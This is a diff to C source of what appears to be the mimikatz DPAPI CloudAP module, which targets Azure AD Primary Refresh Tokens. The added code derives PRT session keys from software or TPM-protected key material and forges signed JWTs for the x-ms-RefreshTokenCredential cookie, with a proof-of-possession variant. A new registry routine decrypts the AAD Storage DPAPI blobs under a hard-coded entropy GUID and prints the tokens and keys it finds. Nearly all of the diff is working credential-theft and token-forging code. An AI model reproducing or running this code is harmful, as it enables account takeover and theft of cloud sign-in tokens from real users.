@@ -5,23 +5,20 @@
 */
 #include "kuhl_m_dpapi_cloudap.h"
 
+const GUID KIWI_DPAPI_ENTROPY_Packer__s_EntropyGUID = {0x74d3d547, 0xdabe, 0x4d9d, {0x91, 0xf1, 0x64, 0x62, 0x42, 0xca, 0xb5, 0x7c}};
+const char KIWI_CryptUtil__s_KnownKey[] = "{VT,SG,ST,PD,TS}-BA-IS-BS-SG-SN+"; // ?
+
 NTSTATUS kuhl_m_dpapi_cloudap_keyvalue_derived(int argc, wchar_t * argv[])
 {
 	LPCWSTR szKeyValue, szContext, szLabel, szKeyName, szPrt, szIat, szDerivedKey;
-	LPSTR sJWT;
+	LPSTR sSeedLabel, sJWT;
 	__time32_t time32 = 0;
 	BOOL isValidContext = FALSE, isDerivedKey = FALSE;
-	PKIWI_POPKEY pKeyValue;
+	PKIWI_POPKEY pKeyValue = NULL;
 	LPVOID pDataOut;
-	DWORD cbKeyValue, dwDataOutLen;
+	DWORD cbSeedLabel, cbKeyValue = 0, dwDataOutLen;
 	PKIWI_POPKEY_HARD pHard;
 	BYTE Context[24], DerivedKey[32];
-	NCryptBuffer buffer[] = {
-		{0, KDF_LABEL, NULL},
-		{sizeof(Context), KDF_CONTEXT, Context},
-		{sizeof(NCRYPT_SHA256_ALGORITHM), KDF_HASH_ALGORITHM, NCRYPT_SHA256_ALGORITHM},
-	};
-	NCryptBufferDesc bufferDesc = {NCRYPTBUFFER_VERSION, ARRAYSIZE(buffer), buffer};
 
 	if(kull_m_string_args_byName(argc, argv, L"context", &szContext, NULL))
 	{
@@ -33,11 +30,11 @@ NTSTATUS kuhl_m_dpapi_cloudap_keyvalue_derived(int argc, wchar_t * argv[])
 		CDGenerateRandomBits(Context, sizeof(Context));
 
 	kull_m_string_args_byName(argc, argv, L"label", &szLabel, L"AzureAD-SecureConversation");
-	if(buffer[0].pvBuffer = kull_m_string_unicode_to_ansi(szLabel))
+	if(sSeedLabel = kull_m_string_unicode_to_ansi(szLabel))
 	{
-		buffer[0].cbBuffer = lstrlenA((LPCSTR) buffer[0].pvBuffer);
-		kprintf(L"Label      : %.*S\nContext    : ", buffer[0].cbBuffer, buffer[0].pvBuffer);
-		kull_m_string_wprintf_hex(buffer[1].pvBuffer, buffer[1].cbBuffer, 0);
+		cbSeedLabel = lstrlenA(sSeedLabel);
+		kprintf(L"Label      : %.*S\nContext    : ", cbSeedLabel, sSeedLabel);
+		kull_m_string_wprintf_hex(Context, sizeof(Context), 0);
 		kprintf(L"\n");
 		if(kull_m_string_args_byName(argc, argv, L"keyvalue", &szKeyValue, NULL))
 		{
@@ -48,7 +45,7 @@ NTSTATUS kuhl_m_dpapi_cloudap_keyvalue_derived(int argc, wchar_t * argv[])
 					kprintf(L"Key type   : Software (RAW)\nClear key  : ");
 					kull_m_string_wprintf_hex(pDataOut, dwDataOutLen, 0);
 					kprintf(L"\n");
-					isDerivedKey = kuhl_m_dpapi_cloudap_keyvalue_derived_software(&bufferDesc, (LPCBYTE) pDataOut, dwDataOutLen, DerivedKey, sizeof(DerivedKey));
+					isDerivedKey = kull_m_crypto_ngc_keyvalue_derived_software((PBYTE) sSeedLabel, cbSeedLabel, Context, sizeof(Context), (LPCBYTE) pDataOut, dwDataOutLen, DerivedKey, sizeof(DerivedKey));
 					LocalFree(pDataOut);
 				}
 				else PRINT_ERROR(L"Unable to convert from hex\n");
@@ -62,7 +59,7 @@ NTSTATUS kuhl_m_dpapi_cloudap_keyvalue_derived(int argc, wchar_t * argv[])
 						kprintf(L"Key type   : TPM protected (RAW)\nKey Name   : %s\nOpaque key : ", szKeyName);
 						kull_m_string_wprintf_hex(pDataOut, dwDataOutLen, 0);
 						kprintf(L"\n");
-						isDerivedKey = kuhl_m_dpapi_cloudap_keyvalue_derived_hardware(&bufferDesc, szKeyName, (LPCBYTE) pDataOut, dwDataOutLen, DerivedKey, sizeof(DerivedKey));
+						isDerivedKey = kull_m_crypto_ngc_keyvalue_derived_hardware((PBYTE) sSeedLabel, cbSeedLabel, Context, sizeof(Context), szKeyName, (LPCBYTE) pDataOut, dwDataOutLen, DerivedKey, sizeof(DerivedKey));
 					}
 					else PRINT_ERROR(L"An opaque key need a /keyname:SK-... to import it\n");
 					LocalFree(pDataOut);
@@ -80,20 +77,20 @@ NTSTATUS kuhl_m_dpapi_cloudap_keyvalue_derived(int argc, wchar_t * argv[])
 						kprintf(L"Software (DPAPI)\nClear key  : ");
 						kull_m_string_wprintf_hex(pDataOut, dwDataOutLen, 0);
 						kprintf(L"\n");
-						isDerivedKey = kuhl_m_dpapi_cloudap_keyvalue_derived_software(&bufferDesc, (LPCBYTE) pDataOut, dwDataOutLen, DerivedKey, sizeof(DerivedKey));
+						isDerivedKey = kull_m_crypto_ngc_keyvalue_derived_software((PBYTE) sSeedLabel, cbSeedLabel, Context, sizeof(Context), (LPCBYTE) pDataOut, dwDataOutLen, DerivedKey, sizeof(DerivedKey));
 						break;
 					case 2:
 						pHard = (PKIWI_POPKEY_HARD) pDataOut;
 						kprintf(L"TPM protected (DPAPI)\nKey Name   : %.*s\nOpaque key : ", pHard->cbName / sizeof(wchar_t), pHard->data);
 						kull_m_string_wprintf_hex(pHard->data + pHard->cbName, pHard->cbKey, 0);
 						kprintf(L"\n");
-						isDerivedKey = kuhl_m_dpapi_cloudap_keyvalue_derived_hardware(&bufferDesc, (LPCWSTR) pHard->data, pHard->data + pHard->cbName, pHard->cbKey, DerivedKey, sizeof(DerivedKey));
+						isDerivedKey = kull_m_crypto_ngc_keyvalue_derived_hardware((PBYTE) sSeedLabel, cbSeedLabel, Context, sizeof(Context), (LPCWSTR) pHard->data, pHard->data + pHard->cbName, pHard->cbKey, DerivedKey, sizeof(DerivedKey));
 						break;
 					default:
 						PRINT_ERROR(L"KeyValue type is not supported (%u)\n", pKeyValue->type);
 					}
+					LocalFree(pDataOut);
 				}
-				LocalFree(pKeyValue);
 			}
 			else PRINT_ERROR(L"Unable to decode base64\n");
 		}
@@ -110,124 +107,44 @@ NTSTATUS kuhl_m_dpapi_cloudap_keyvalue_derived(int argc, wchar_t * argv[])
 			kprintf(L"Derived Key: ");
 			kull_m_string_wprintf_hex(DerivedKey, sizeof(DerivedKey), 0);
 			kprintf(L"\n");
+		}
 
-			if(kull_m_string_args_byName(argc, argv, L"prt", &szPrt, NULL))
+		if(kull_m_string_args_byName(argc, argv, L"prt", &szPrt, NULL))
+		{
+			if(kull_m_string_args_byName(argc, argv, L"iat", &szIat, NULL))
+				time32 = wcstol(szIat, NULL, 0);
+			else _time32(&time32);
+			kprintf(L"Issued at  : %ld\n", time32);
+
+			if(isDerivedKey)
 			{
-				if(kull_m_string_args_byName(argc, argv, L"iat", &szIat, NULL))
-					time32 = wcstol(szIat, NULL, 0);
-				else _time32(&time32);
-
-				kprintf(L"Issued at  : %ld\n\nSigned JWT : ", time32);
-				if(sJWT = generate_simpleSignature(Context, sizeof(Context), szPrt, &time32, DerivedKey, sizeof(DerivedKey)))
+				kprintf(L"\nSignature with key:\n");
+				if(sJWT = generate_simpleSignature(Context, sizeof(Context), szPrt, &time32, DerivedKey, sizeof(DerivedKey), NULL, 0))
+				{
+					kprintf(L"%S\n\n(for x-ms-RefreshTokenCredential cookie by eg.)\n", sJWT);
+					LocalFree(sJWT);
+				}
+			}
+			if(pKeyValue && cbKeyValue && kull_m_string_args_byName(argc, argv, L"pop", NULL, NULL))
+			{
+				kprintf(L"\nSignature with POP key:\n");
+				if(sJWT = generate_simpleSignature(Context, sizeof(Context), szPrt, &time32, (LPCBYTE) pKeyValue, cbKeyValue, (LPCBYTE) sSeedLabel, cbSeedLabel))
 				{
 					kprintf(L"%S\n\n(for x-ms-RefreshTokenCredential cookie by eg.)\n", sJWT);
 					LocalFree(sJWT);
 				}
 			}
 		}
+
+		if(pKeyValue)
+			LocalFree(pKeyValue);
 	}
 	return STATUS_SUCCESS;
 }
-
-BOOL kuhl_m_dpapi_cloudap_keyvalue_derived_software(PNCryptBufferDesc bufferDesc, LPCBYTE Key, DWORD cbKey, PBYTE DerivedKey, DWORD cbDerivedKey)
+PSTR basicEscapeJsonA(PCSTR toEscape)
 {
-	BOOL status = FALSE;
-	NTSTATUS bStatus;
-
-	BCRYPT_ALG_HANDLE hAlgSP800108;
-	BCRYPT_KEY_HANDLE hKeySP800108;
-	DWORD ObjectLengthSP800108, cbResult;
-	PUCHAR pbKeyObjectSP800108;
-
-	__try
-	{
-		bStatus = BCryptOpenAlgorithmProvider(&hAlgSP800108, BCRYPT_SP800108_CTR_HMAC_ALGORITHM, NULL, 0);
-		if(BCRYPT_SUCCESS(bStatus))
-		{
-			bStatus = BCryptGetProperty(hAlgSP800108, BCRYPT_OBJECT_LENGTH, (PUCHAR) &ObjectLengthSP800108, sizeof(ObjectLengthSP800108), &cbResult, 0);
-			if(BCRYPT_SUCCESS(bStatus))
-			{
-				if(pbKeyObjectSP800108 = (PUCHAR) LocalAlloc(LPTR, ObjectLengthSP800108))
-				{
-					bStatus = BCryptGenerateSymmetricKey(hAlgSP800108, &hKeySP800108, pbKeyObjectSP800108, ObjectLengthSP800108, (PUCHAR) Key, cbKey, 0);
-					if(BCRYPT_SUCCESS(bStatus))
-					{
-						bStatus = BCryptKeyDerivation(hKeySP800108, bufferDesc, DerivedKey, cbDerivedKey, &cbResult, 0);
-						if(BCRYPT_SUCCESS(bStatus))
-						{
-							status = (cbResult == cbDerivedKey);
-							if(!status)
-								PRINT_ERROR(L"Bad cbResult (%u vs %u)\n", cbResult, cbDerivedKey);
-						}
-						else PRINT_ERROR(L"BCryptKeyDerivation: 0x%08x\n", bStatus);
-						BCryptDestroyKey(hKeySP800108);
-					}
-					else PRINT_ERROR(L"BCryptGenerateSymmetricKey: 0x%08x\n", bStatus);
-					LocalFree(pbKeyObjectSP800108);
-				}
-			}
-			else PRINT_ERROR(L"BCryptGetProperty: 0x%08x\n", bStatus);
-			BCryptCloseAlgorithmProvider(hAlgSP800108, 0);
-		}
-		else PRINT_ERROR(L"BCryptOpenAlgorithmProvider: 0x%08x\n", bStatus);
-	}
-	__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND)
-	{
-		PRINT_ERROR(L"No CNG?\n");
-	}
-	return status;
-}
-
-BOOL kuhl_m_dpapi_cloudap_keyvalue_derived_hardware(PNCryptBufferDesc bufferDesc, LPCWSTR TransportKeyName, LPCBYTE Key, DWORD cbKey, PBYTE DerivedKey, DWORD cbDerivedKey)
-{
-	BOOL status = FALSE;
-	SECURITY_STATUS nStatus;
-	NCRYPT_PROV_HANDLE hProvider;
-	NCRYPT_KEY_HANDLE hImportKey, hKey;
-	DWORD cbResult;
-	PNCRYPTKEYDERIVATION NCryptKeyDerivation; // tofix
-
-	__try
-	{
-		nStatus = NCryptOpenStorageProvider(&hProvider, MS_PLATFORM_CRYPTO_PROVIDER, 0);
-		if(nStatus == ERROR_SUCCESS)
-		{
-			nStatus = NCryptOpenKey(hProvider, &hImportKey, TransportKeyName, 0, 0);
-			if(nStatus == ERROR_SUCCESS)
-			{
-				nStatus = NCryptImportKey(hProvider, hImportKey, NCRYPT_OPAQUETRANSPORT_BLOB, NULL, &hKey, (PBYTE) Key, cbKey, 0);
-				if(nStatus == ERROR_SUCCESS)
-				{
-					NCryptKeyDerivation = (PNCRYPTKEYDERIVATION) GetProcAddress(GetModuleHandle(L"ncrypt.dll"), "NCryptKeyDerivation"); // tofix
-					nStatus = NCryptKeyDerivation(hKey, bufferDesc, DerivedKey, cbDerivedKey, &cbResult, 0);
-					if(nStatus == ERROR_SUCCESS)
-					{
-						status = (cbResult == cbDerivedKey);
-						if(!status)
-							PRINT_ERROR(L"Bad cbResult (%u vs %u)\n", cbResult, cbDerivedKey);
-					}
-					else PRINT_ERROR(L"NCryptKeyDerivation: 0x%08x\n", nStatus);
-					NCryptFreeObject(hKey);
-				}
-				else PRINT_ERROR(L"NCryptImportKey: 0x%08x\n", nStatus);
-				NCryptFreeObject(hImportKey);
-			}
-			else PRINT_ERROR(L"NCryptOpenKey: 0x%08x\n", nStatus);
-			NCryptFreeObject(hProvider);
-		}
-		else PRINT_ERROR(L"NCryptOpenStorageProvider: 0x%08x\n", nStatus);
-	}
-	__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND)
-	{
-		PRINT_ERROR(L"No CNG?\n");
-	}
-	return status;
-}
-
-PSTR basicEscapeJson(PCSTR toEscape)
-{
-	DWORD i, j, lenEscaped;
 	PSTR ret = NULL;
+	DWORD i, j, lenEscaped;
 
 	j = lenEscaped = lstrlenA(toEscape);
 	for(i = 0; i < j; i++)
@@ -249,13 +166,33 @@ PSTR basicEscapeJson(PCSTR toEscape)
 	return ret;
 }
 
+PSTR basicUnEscapeJsonA(PCSTR toUnEscape)
+{
+	PSTR ret = NULL;
+	DWORD i, j, lenUnEscaped;
+
+	lenUnEscaped = lstrlenA(toUnEscape);
+
+	if(ret = (PSTR) LocalAlloc(LPTR, lenUnEscaped + 1))
+	{
+		for(i = 0, j = 0; j < lenUnEscaped; i++, j++)
+		{
+			if(toUnEscape[j] == '\\')
+				j++;
+			ret[i] = toUnEscape[j];
+		}
+	}
+
+	return ret;
+}
+
 PSTR generate_simpleHeader(PCSTR Alg, LPCBYTE Context, DWORD cbContext)
 {
 	PSTR base64 = NULL, header, ctxBase64, escapedCtxBase64;
 
 	if(kull_m_string_quick_binary_to_base64A(Context, cbContext, &ctxBase64))
 	{
-		if(escapedCtxBase64 = basicEscapeJson(ctxBase64))
+		if(escapedCtxBase64 = basicEscapeJsonA(ctxBase64))
 		{
 			if(kull_m_string_sprintfA(&header, "{\"alg\":\"%s\", \"ctx\":\"%s\"}", Alg, escapedCtxBase64))
 			{
@@ -285,7 +222,7 @@ PSTR generate_simplePayload(PCWSTR PrimaryRefreshToken, __time32_t *iat)
 		if(prtDec = (PSTR) LocalAlloc(LPTR, cbData + 1))
 		{
 			RtlCopyMemory(prtDec, data, cbData);
-			if(escapedPrt = basicEscapeJson(prtDec))
+			if(escapedPrt = basicEscapeJsonA(prtDec))
 			{
 				if(kull_m_string_sprintfA(&payload, "{\"refresh_token\":\"%s\", \"is_primary\":\"true\", \"iat\":\"%ld\"}", escapedPrt, time32))
 				{
@@ -301,66 +238,198 @@ PSTR generate_simplePayload(PCWSTR PrimaryRefreshToken, __time32_t *iat)
 	return base64;
 }
 
-const char cPoint = '.';
-PSTR generate_simpleSignature(LPCBYTE Context, DWORD cbContext, PCWSTR PrimaryRefreshToken, __time32_t *iat, LPCBYTE Key, DWORD cbKey)
+PSTR generate_simpleSignature(LPCBYTE Context, DWORD cbContext, PCWSTR PrimaryRefreshToken, __time32_t *iat, LPCBYTE Key, DWORD cbKey, OPTIONAL LPCBYTE SeedLabel, OPTIONAL DWORD cbSeedLabel)
 {
-	PSTR jwt = NULL, header64, payload64, signature64;
-	NTSTATUS status;
-	BCRYPT_ALG_HANDLE hAlgorithm;
-	BCRYPT_HASH_HANDLE hHash;
-	DWORD ObjectLength, cbResult;
-	PUCHAR pbHashObject;
-	BYTE Hash[32];
+	PSTR jwt = NULL, header64, payload64, sHeader64PointPayload64, signature64;
+	BYTE Hash[32], *pHash;
+	DWORD cbHash;
+	BOOL isSigned = FALSE;
 
 	if(header64 = generate_simpleHeader("HS256", Context, cbContext))
 	{
 		if(payload64 = generate_simplePayload(PrimaryRefreshToken, iat))
 		{
-			__try
+			if(kull_m_string_sprintfA(&sHeader64PointPayload64, "%s.%s", header64, payload64))
 			{
-				status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_SHA256_ALGORITHM, MS_PRIMITIVE_PROVIDER, BCRYPT_ALG_HANDLE_HMAC_FLAG);
-				if(BCRYPT_SUCCESS(status))
+				if(SeedLabel && cbSeedLabel)
 				{
-					status = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PUCHAR) &ObjectLength, sizeof(ObjectLength), &cbResult, 0);
-					if(BCRYPT_SUCCESS(status))
+					if(kull_m_crypto_ngc_signature_pop((PBYTE) Key, cbKey, (PBYTE) SeedLabel, cbSeedLabel, (PBYTE) Context, cbContext, (PBYTE) sHeader64PointPayload64, lstrlenA(sHeader64PointPayload64), &pHash, &cbHash))
 					{
-						if(pbHashObject = (PUCHAR) LocalAlloc(LPTR, ObjectLength))
+						if(cbHash == sizeof(Hash))
 						{
-							status = BCryptCreateHash(hAlgorithm, &hHash, pbHashObject, ObjectLength, (PUCHAR) Key, cbKey, 0);
-							if(BCRYPT_SUCCESS(status))
-							{
-								BCryptHashData(hHash, (PUCHAR) header64, lstrlenA(header64), 0);
-								BCryptHashData(hHash, (PUCHAR) &cPoint, sizeof(cPoint), 0);
-								BCryptHashData(hHash, (PUCHAR) payload64, lstrlenA(payload64), 0);
-								status = BCryptFinishHash(hHash, Hash, sizeof(Hash), 0);
-								if(BCRYPT_SUCCESS(status))
-								{
-									if(kull_m_string_quick_binary_to_urlsafe_base64A(Hash, sizeof(Hash), &signature64))
-									{
-										kull_m_string_sprintfA(&jwt, "%s.%s.%s", header64, payload64, signature64);
-										LocalFree(signature64);
-									}
-								}
-								else PRINT_ERROR(L"BCryptFinishHash: 0x%08x\n", status);
-
-								BCryptDestroyHash(hHash);
-							}
-							else PRINT_ERROR(L"BCryptCreateHash: 0x%08x\n", status);
-							LocalFree(pbHashObject);
+							RtlCopyMemory(Hash, pHash, sizeof(Hash));
+							LocalFree(pHash);
+							isSigned = TRUE;
 						}
 					}
-					else PRINT_ERROR(L"BCryptGetProperty: 0x%08x\n", status);
-					BCryptCloseAlgorithmProvider(hAlgorithm, 0);
 				}
-				else PRINT_ERROR(L"BCryptOpenAlgorithmProvider: 0x%08x\n", status);
-			}
-			__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND)
-			{
-				PRINT_ERROR(L"No CNG?\n");
+				else
+				{
+					isSigned = kull_m_crypto_ngc_signature_derived(Key, cbKey, (LPCBYTE) sHeader64PointPayload64, lstrlenA(sHeader64PointPayload64), Hash, sizeof(Hash));
+				}
+
+				if(isSigned)
+				{
+					if(kull_m_string_quick_binary_to_urlsafe_base64A(Hash, sizeof(Hash), &signature64))
+					{
+						kull_m_string_sprintfA(&jwt, "%s.%s", sHeader64PointPayload64, signature64);
+						LocalFree(signature64);
+					}
+				}
+				LocalFree(sHeader64PointPayload64);
 			}
 			LocalFree(payload64);
 		}
 		LocalFree(header64);
 	}
 	return jwt;
+}
+
+void dealWithKey(LPVOID pDataOut, DWORD dwDataOutLen)
+{
+	PSTR keyStr, unEscaped;
+	if(keyStr = (PSTR) LocalAlloc(LPTR, dwDataOutLen + 1))
+	{
+		RtlCopyMemory(keyStr, pDataOut, dwDataOutLen);
+		if(unEscaped = basicUnEscapeJsonA(keyStr))
+		{
+			kprintf(L"%S\n", unEscaped);
+			LocalFree(unEscaped);
+		}
+		LocalFree(keyStr);
+	}
+}
+
+void dealWithJwt(LPVOID pDataOut, DWORD dwDataOutLen)
+{
+	PSTR jwtStr, begin, end;
+	PBYTE data;
+	DWORD dwData;
+
+	kprintf(L"Raw JWT: %.*S\n", dwDataOutLen, pDataOut);
+	if(jwtStr = (PSTR) LocalAlloc(LPTR, dwDataOutLen + 1))
+	{
+		RtlCopyMemory(jwtStr, pDataOut, dwDataOutLen);
+		begin = strchr(jwtStr, '.');
+		if(begin)
+		{
+			begin++;
+			end = strchr(begin, '.');
+			if(end)
+			{
+				*end = '\0';
+				if(kull_m_string_quick_urlsafe_base64_to_BinaryA(begin, &data, &dwData))
+				{
+					kprintf(L"Payload: %.*S\n", dwData, data);
+					LocalFree(data);
+				}
+			}
+		}
+		LocalFree(jwtStr);
+	}
+}
+
+void dealWithEntries(int argc, wchar_t * argv[], PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hKeyProv)
+{
+	DWORD i, c, type, nbValues, szMaxValueNameLen, szMaxValueLen, szSecretName, szEntry, szData;
+	PBYTE entry, data;
+	wchar_t *secretName, *ptr;
+	LPVOID pDataOut;
+	DWORD dwDataOutLen;
+
+	if(kull_m_registry_RegQueryInfoKey(hRegistry, hKeyProv, NULL, NULL, NULL, NULL, NULL, NULL, &nbValues, &szMaxValueNameLen, &szMaxValueLen, NULL, NULL))
+	{
+		szMaxValueNameLen++;
+		if(secretName = (wchar_t *) LocalAlloc(LPTR, (szMaxValueNameLen + 1) * sizeof(wchar_t)))
+		{
+			if(entry = (PBYTE) LocalAlloc(LPTR, szMaxValueLen))
+			{
+				for(i = 0; i < nbValues; i++)
+				{
+					szSecretName = szMaxValueNameLen;
+					szEntry = szMaxValueLen;
+					if(kull_m_registry_RegEnumValue(hRegistry, hKeyProv, i, secretName, &szSecretName, NULL, &type, entry, &szEntry))
+					{
+						kprintf(L"\t[%s]\n", secretName);
+						if(type == REG_MULTI_SZ)
+						{
+							for(ptr = (wchar_t *) entry, c = 0; *ptr; ptr += lstrlen(ptr) + 1)
+							{
+								if(!wcsncmp(ptr, L"1-", 2))
+								{
+									if(kull_m_string_quick_base64_to_Binary(ptr + 2, &data, &szData))
+									{
+										if(kuhl_m_dpapi_unprotect_raw_or_blob(data, szData, NULL, argc, argv, &KIWI_DPAPI_ENTROPY_Packer__s_EntropyGUID, sizeof(KIWI_DPAPI_ENTROPY_Packer__s_EntropyGUID), &pDataOut, &dwDataOutLen, NULL))
+										{
+											switch(c)
+											{
+											case 0:
+												kprintf(L" [JWT]\n");
+												dealWithJwt(pDataOut, dwDataOutLen);
+												break;
+											case 1:
+												kprintf(L" [Key]\n");
+												dealWithKey(pDataOut, dwDataOutLen);
+												break;
+											default:
+												PRINT_ERROR(L"Unknow type: %u\n", c);
+												kull_m_string_wprintf_hex(pDataOut, dwDataOutLen, 1);
+												kprintf(L"\n");
+											}
+											LocalFree(pDataOut);
+										}
+										c++;
+										LocalFree(data);
+									}
+								}
+							}
+						}
+						else PRINT_ERROR(L"Incompatible REG type: %u\n", type);
+					}
+				}
+				LocalFree(entry);
+			}
+			LocalFree(secretName);
+		}
+	}
+}
+
+NTSTATUS kuhl_m_dpapi_cloudap_fromreg(int argc, wchar_t * argv[])
+{
+	PKULL_M_REGISTRY_HANDLE hRegistry;
+	HKEY hKeyStorage, hKeyProv;
+	DWORD i, nbSubKeys, szMaxSubKeyLen, szKey;
+	wchar_t * keyName;
+	if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_OWN, NULL, FALSE, &hRegistry)) // todo: offline
+	{
+		if(kull_m_registry_RegOpenKeyEx(hRegistry, HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\AAD\\Storage", 0, KEY_READ, &hKeyStorage))
+		{
+			if(kull_m_registry_RegQueryInfoKey(hRegistry, hKeyStorage, NULL, NULL, NULL, &nbSubKeys, &szMaxSubKeyLen, NULL, NULL, NULL, NULL, NULL, NULL))
+			{
+				szMaxSubKeyLen++;
+				if(keyName = (wchar_t *) LocalAlloc(LPTR, (szMaxSubKeyLen + 1) * sizeof(wchar_t)))
+				{
+					for(i = 0; i < nbSubKeys; i++)
+					{
+						szKey = szMaxSubKeyLen;
+						if(kull_m_registry_RegEnumKeyEx(hRegistry, hKeyStorage, i, keyName, &szKey, NULL, NULL, NULL, NULL))
+						{
+							kprintf(L"[%u] %s\n", i, keyName);
+
+							if(kull_m_registry_RegOpenKeyEx(hRegistry, hKeyStorage, keyName, 0, KEY_READ, &hKeyProv))
+							{
+								dealWithEntries(argc, argv, hRegistry, hKeyProv);
+								kull_m_registry_RegCloseKey(hRegistry, hKeyProv);
+							}
+						}
+					}
+					LocalFree(keyName);
+				}
+			}
+			kull_m_registry_RegCloseKey(hRegistry, hKeyStorage);
+		}
+		else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx");
+		kull_m_registry_close(hRegistry);
+	}
+	return STATUS_SUCCESS;
 }
